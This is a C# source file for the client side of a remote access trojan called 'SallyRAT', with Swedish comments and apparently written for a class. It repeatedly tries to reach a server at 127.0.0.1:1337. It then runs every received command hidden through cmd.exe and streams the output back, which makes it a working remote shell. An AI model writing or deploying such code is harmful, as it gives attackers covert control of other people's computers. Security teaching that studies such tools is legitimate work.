using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace clientSallyRAT
{
    class Client
    {
        static void Main(string[] args)
        {

            TcpClient client = null; // här skapar vi variabler för TcpClient, NetworkStream, StreamReader och StreamWriter

            NetworkStream stream = null;
            StreamReader reader = null;
            StreamWriter writer = null;

            while (client == null || !client.Connected) // här försöker vi ansluta till servern
            {
                try 
                {
                    Console.WriteLine("Attempting to connect to SallyRAT");
                    client = new TcpClient();
                    client.Connect("127.0.0.1", 1337);

                    stream = client.GetStream();
                    reader = new StreamReader(stream);
                    writer = new StreamWriter(stream) { AutoFlush = true };

                    Console.WriteLine("YAYYYYY WE HAVE CONNECTED TO SERVER");
                }
                catch (Exception ex) // om vi inte kan ansluta till servern så skriver vi ut ett felmeddelande och försöker igen om 5 sekunder
                {
                    Console.WriteLine("Failed to connect to SallyRAT");
                    Console.WriteLine(ex.Message);
                    Console.WriteLine("Trying Again In 5 Seconds.");
                    System.Threading.Thread.Sleep(5000);
                }
            }
            Console.WriteLine("Successfully Slaved to SallyRAT");

            try
            {

                while (client.Connected) // Denna loopen är igång sålänge jag är ansluten till servern
                {
                    string command = reader.ReadLine();

                    if (string.IsNullOrEmpty(command)) // om kommandot är tomt så ignoreras det och låter loopen starta om
                    {
                        continue;
                    }

                    Process process = new Process(); // här startar vi en process som kör cmd.exe och kör kommandot som vi skickade från servern
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + command;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();



                    string output; 
                    while ((output = process.StandardOutput.ReadLine()) != null) // Denna gör att det som kommer upp på clientsided skickas över till Servern och sen kan den även skriva multilined text som tex ipconfig
                    {
                        writer.WriteLine(output); 
                    }

                    writer.WriteLine("END_OF_OUTPUT"); //här skickar vi till servern för "logik" att outputtet är slut PS william är da teacher
                } 
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            finally
            {
                writer.Close();
                reader.Close();
                stream.Close();
                client.Close();
            }

        }
    }
}
